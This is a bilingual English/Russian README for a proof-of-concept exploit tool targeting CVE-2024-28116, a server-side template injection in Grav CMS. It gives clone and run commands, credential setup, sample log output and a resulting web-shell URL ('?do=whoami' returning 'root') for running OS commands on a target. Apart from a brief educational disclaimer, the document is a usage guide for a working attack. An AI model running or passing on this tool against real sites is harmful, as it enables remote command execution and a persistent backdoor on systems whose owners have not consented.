
# EN
**GenGravSSTIExploit** is a PoC Python script that exploits an authenticated Server-Side Template Injection (SSTI) vulnerability in Grav CMS versions <= 1.7.44 (CVE-2024-28116). This vulnerability allows a user with editor permissions to execute OS commands on a remote server. 

**Note**: This script requires valid credentials to authenticate on the Grav CMS console.

## Features

- Authenticates with the Grav CMS admin panel using editor credentials.
- Creates a new page on the CMS to inject a payload.
- Executes OS commands remotely by leveraging the SSTI vulnerability.

## Requirements

- Python 3.x
- `requests` library (install with `pip install requests`)


## Usage

1. **Clone the Repository**
    ```bash
    git clone https://github.com/geniuszly/GenGravSSTIExploit
    cd GenGravSSTIExploit
    ```

2. **Configure Credentials**

   Edit the script to provide your Grav CMS editor credentials:
   ```python
   GRAV_USER = "youruser"
   GRAV_PASSWORD = "yourpassword"
   ```

3. **Run the Script**

   Use the following command to run the script:
   ```bash
   python GenGravSSTIExploit.py -t <TARGET_URL> -p <PORT>
   ```
   - `<TARGET_URL>`: Target URL in the format `http[s]://hostname`.
   - `<PORT>`: Port number (default is 80).

   **Example:**
   ```bash
   python GenGravSSTIExploit.py -t http://example.com -p 8080
   ```

4. **Interact with the Exploit**

   If the exploit is successful, you will be given a URL where you can execute OS commands:
   ```
   [+] RCE payload injected. Visit the malicious page: http://example.com:8080/poc_<ID>?do=<command>
   ```

## Example output
 ```bash
   python GenGravSSTIExploit.py -t http://example.com -p 8080
   ```
The script will perform each step, providing you with updates through the terminal. Here is what you might see:
```
2024-10-02 12:00:01 - INFO - Проверка целевого URL...
2024-10-02 12:00:02 - INFO - Получение session cookie и login-nonce...
2024-10-02 12:00:03 - INFO - Попытка аутентификации в Grav CMS...
2024-10-02 12:00:04 - INFO - Доступ к админ-панели после аутентификации...
2024-10-02 12:00:05 - INFO - Создание новой страницы...
2024-10-02 12:00:06 - INFO - Получение form-nonce и unique_form_id...
2024-10-02 12:00:07 - INFO - Инъекция RCE-полезной нагрузки...
2024-10-02 12:00:08 - INFO - [+] Инъекция RCE успешна. Перейдите по ссылке: http://example.com:8080/poc_4T7B?do=<command>
```
After the script completes, you will see a message with the link to the injected page. You can visit this link to execute OS commands
```
http://example.com:8080/poc_4T7B?do=whoami
```
Visiting the URL with the specified command will display the output directly on the page:
```
Cmd-Output:
root
```

## Disclaimer

This tool is intended for educational purposes only. Use it responsibly and only on systems where you have explicit permission. The author is not responsible for any misuse or damage caused by this script.


# RU
**GenGravSSTIExploit** — это PoC скрипт на Python , эксплуатирующий аутентифицированную уязвимость SSTI (Server-Side Template Injection) в Grav CMS версий <= 1.7.44 (CVE-2024-28116). Эта уязвимость позволяет пользователю с правами редактора выполнять команды ОС на удаленном сервере.

**Примечание**: Скрипт требует действительных учетных данных для авторизации в админ-панели Grav CMS.


## Особенности

- Аутентификация в админ-панели Grav CMS с использованием учетных данных редактора.
- Создание новой страницы на CMS для инъекции полезной нагрузки.
- Выполнение команд ОС удаленно, используя уязвимость SSTI.

## Требования

- Python 3.x
- Библиотека `requests` (установить через `pip install requests`)

## Использование

1. **Клонируйте репозиторий**
    ```bash
    git clone https://github.com/geniuszly/GenGravSSTIExploit
    cd GenGravSSTIExploit
    ```

2. **Настройте учетные данные**

   Отредактируйте скрипт и введите учетные данные редактора Grav CMS:
   ```python
   GRAV_USER = "youruser"
   GRAV_PASSWORD = "yourpassword"
   ```

3. **Запустите скрипт**

   Используйте следующую команду для запуска скрипта:
   ```bash
   python GenGravSSTIExploit.py -t <TARGET_URL> -p <PORT>
   ```
   - `<TARGET_URL>`: Целевой URL в формате `http[s]://hostname`.
   - `<PORT>`: Номер порта (по умолчанию 80).

   **Пример:**
   ```bash
   python GenGravSSTIExploit.py -t http://example.com -p 8080
   ```

4. **Взаимодействие с эксплойтом**

   Если эксплойт прошел успешно, вы получите URL, где сможете выполнить команды ОС:
   ```
   [+] Инъекция RCE успешна. Перейдите по ссылке: http://example.com:8080/poc_<ID>?do=<command>
   ```

## Пример вывода
 ```bash
   python GenGravSSTIExploit.py -t http://example.com -p 8080
   ```
Скрипт будет выполнять каждый шаг, предоставляя вам обновления через терминал. Вот что вы можете увидеть:
```
2024-10-02 12:00:01 - INFO - Проверка целевого URL...
2024-10-02 12:00:02 - INFO - Получение session cookie и login-nonce...
2024-10-02 12:00:03 - INFO - Попытка аутентификации в Grav CMS...
2024-10-02 12:00:04 - INFO - Доступ к админ-панели после аутентификации...
2024-10-02 12:00:05 - INFO - Создание новой страницы...
2024-10-02 12:00:06 - INFO - Получение form-nonce и unique_form_id...
2024-10-02 12:00:07 - INFO - Инъекция RCE-полезной нагрузки...
2024-10-02 12:00:08 - INFO - [+] Инъекция RCE успешна. Перейдите по ссылке: http://example.com:8080/poc_4T7B?do=<command>
```
После завершения работы скрипта вы увидите сообщение со ссылкой на внедренную страницу. Вы можете перейти по этой ссылке для выполнения команд:
```
http://example.com:8080/poc_4T7B?do=whoami
```
Посещение URL-адреса с помощью указанной команды приведет к отображению вывода прямо на странице:
```
Cmd-Output:
root
```

## Отказ от ответственности

Этот инструмент предназначен только для образовательных целей. Используйте его ответственно и только на системах, где у вас есть явное разрешение. Автор не несет ответственности за любое злоупотребление или ущерб, вызванный этим скриптом.
